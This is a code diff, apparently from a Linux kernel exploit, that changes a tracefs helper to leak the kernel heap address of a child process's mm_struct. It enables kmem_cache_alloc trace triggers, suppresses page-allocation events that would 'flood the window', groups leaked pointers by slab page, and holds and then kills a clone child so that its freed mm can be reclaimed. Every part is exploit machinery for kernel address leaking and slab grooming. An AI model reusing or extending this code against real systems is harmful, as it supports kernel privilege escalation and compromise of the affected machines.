@@ -1,7 +1,7 @@
 #ifndef TRACEFS_MM_H
 #define TRACEFS_MM_H
 
-/* mm_struct address from dup_mm's kmem_cache_alloc record. */
+/* mm_struct address of the leak child from its dup_mm kmem_cache_alloc record. */
 
 #ifndef SLIDE_TRACEFS_MM_OBJECT
 #define SLIDE_TRACEFS_MM_OBJECT 0x400ULL
@@ -12,17 +12,13 @@
 #ifndef SLIDE_TRACEFS_MM_CAPTURE_KB
 #define SLIDE_TRACEFS_MM_CAPTURE_KB 4096
 #endif
-#ifndef SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS
-#define SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS 8
-#endif
-#ifndef SLIDE_TRACEFS_MM_PAGE_SIZE
-#define SLIDE_TRACEFS_MM_PAGE_SIZE 0x8000ULL
-#endif
-#define TRACEFS_MM_MAX_PTRS 4096
-#define TRACEFS_MM_SCAN_PAGES 64
+#define TRACEFS_MM_SLAB_SIZE 0x8000ULL
+#define TRACEFS_MM_MAX_PTRS 256
+#define TRACEFS_MM_SCAN_PAGES 4096
 
 static struct {
   int armed;
+  pid_t child;
   uint32_t old_tracing;
   uint32_t old_buffer;
   pid_t tid;
@@ -220,6 +216,9 @@ static int tracefs_mm_start(void) {
   /* Events enabled before the first tracing_on=1 stay inactive for the burst. */
   tracefs_mm_state.armed =
       tracefs_mm_write(trigger_path, "enable_event:kmem:kmem_cache_alloc\n");
+  /* Page events from the slide stage would flood the window. */
+  tracefs_mm_write("/sys/kernel/tracing/events/kmem/mm_page_alloc/enable", "0");
+  tracefs_mm_write("/sys/kernel/tracing/events/kmem/mm_page_free/enable", "0");
   tracefs_mm_state.tid = (pid_t)syscall(SYS_gettid);
   if (!tracefs_mm_state.armed) {
     pr_warning("mm trace trigger denied errno=%d\n", errno);
@@ -232,65 +231,10 @@ static int tracefs_mm_start(void) {
   return 1;
 }
 
-static int tracefs_mm_finish(uintptr_t *leaked, size_t min_index,
-                             size_t max_index) {
+static void tracefs_mm_stop(void) {
   if (!tracefs_mm_state.armed) {
-    return 0;
+    return;
   }
-  tracefs_mm_write("/sys/kernel/tracing/tracing_on", "0");
-  tracefs_mm_drain();
-
-  uintptr_t best_base = 0;
-  size_t best_objects = 0;
-  size_t best_index = 0;
-  /* Prefer pages with an object in the index window, then the densest. */
-  long best_rank = -1;
-  for (size_t i = 0; i < tracefs_mm_state.count; i++) {
-    uintptr_t base = tracefs_mm_ptrs[i] & ~(SLIDE_TRACEFS_MM_PAGE_SIZE - 1);
-    size_t objects = 0;
-    int covers = 0;
-    for (size_t j = 0; j < tracefs_mm_state.count; j++) {
-      if ((tracefs_mm_ptrs[j] & ~(SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) != base) {
-        continue;
-      }
-      objects++;
-      size_t index =
-          (size_t)((tracefs_mm_ptrs[j] & (SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) /
-                   SLIDE_TRACEFS_MM_OBJECT);
-      if (index >= min_index && index <= max_index) {
-        covers = 1;
-      }
-    }
-    long rank = (covers ? 1000000L : 0L) + (long)objects;
-    if (rank > best_rank) {
-      best_rank = rank;
-      best_objects = objects;
-      best_base = base;
-    }
-  }
-  int found = 0;
-  if (best_base && best_objects >= SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS) {
-    for (size_t i = 0; i < tracefs_mm_state.count; i++) {
-      if ((tracefs_mm_ptrs[i] & ~(SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) !=
-          best_base) {
-        continue;
-      }
-      size_t index =
-          (size_t)((tracefs_mm_ptrs[i] & (SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) /
-                   SLIDE_TRACEFS_MM_OBJECT);
-      if (index < min_index || index > max_index) {
-        continue;
-      }
-      best_index = index;
-      *leaked = best_base + index * SLIDE_TRACEFS_MM_OBJECT;
-      found = 1;
-      break;
-    }
-  }
-  pr_info("mm trace page=%016zx objects=%zu index=%zu found=%d hits=%zu "
-          "records=%u\n", best_base, best_objects, best_index, found,
-          tracefs_mm_state.count, tracefs_mm_state.records);
-
   char text[64];
   snprintf(text, sizeof(text), "!enable_event:kmem:kmem_cache_alloc\n");
   tracefs_mm_write("/sys/kernel/tracing/events/kmem/rss_stat/trigger", text);
@@ -299,7 +243,82 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t min_index,
   snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_tracing);
   tracefs_mm_write("/sys/kernel/tracing/tracing_on", text);
   tracefs_mm_state.armed = 0;
-  return found;
+}
+
+static int tracefs_mm_available(void) {
+  int armed = tracefs_mm_start();
+  tracefs_mm_stop();
+  return armed;
+}
+
+/* Clone a child that stays alive until its mm was handed to the caller. */
+static pid_t tracefs_mm_clone_hold(void) {
+  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1) {
+      _exit(1);
+    }
+    for (;;) {
+      pause();
+    }
+  }
+  tracefs_mm_state.child = child;
+  return child;
+}
+
+/* Pick an in-window object of a slab page that holds only our mm_structs. */
+/* The leak child is the pick-th clone of the window, like the futex path. */
+static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
+                             size_t max_index) {
+  if (!tracefs_mm_state.armed) {
+    return 0;
+  }
+  tracefs_mm_write("/sys/kernel/tracing/tracing_on", "0");
+  tracefs_mm_drain();
+  uintptr_t best = 0;
+  size_t best_objects = 0;
+  size_t best_index = 0;
+  if (pick < tracefs_mm_state.count) {
+    uintptr_t base = tracefs_mm_ptrs[pick] & ~(TRACEFS_MM_SLAB_SIZE - 1);
+    for (size_t j = 0; j < tracefs_mm_state.count; j++) {
+      if ((tracefs_mm_ptrs[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) == base) {
+        best_objects++;
+      }
+    }
+    /* The leak child's page is freed last, so reclaim picks it first. */
+    for (size_t j = 0; j < tracefs_mm_state.count; j++) {
+      if ((tracefs_mm_ptrs[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) != base) {
+        continue;
+      }
+      size_t index = (size_t)((tracefs_mm_ptrs[j] - base) /
+                              SLIDE_TRACEFS_MM_OBJECT);
+      if (index < min_index || index > max_index) {
+        continue;
+      }
+      best = tracefs_mm_ptrs[j];
+      best_index = index;
+      break;
+    }
+  }
+  pr_info("mm trace leak found=%d objects=%zu index=%zu leaked=%016zx "
+          "pick=%zu hits=%zu records=%u\n", best != 0, best_objects,
+          best_index, best, pick, tracefs_mm_state.count,
+          tracefs_mm_state.records);
+  tracefs_mm_stop();
+  if (!best) {
+    return 0;
+  }
+  *leaked = best;
+  return 1;
+}
+
+/* Let the leak child exit once its memfd was opened, so its mm is freed. */
+static void tracefs_mm_release_child(void) {
+  if (tracefs_mm_state.child > 0) {
+    SYSCHK(kill(tracefs_mm_state.child, SIGKILL));
+    tracefs_mm_state.child = -1;
+  }
 }
 
 #endif
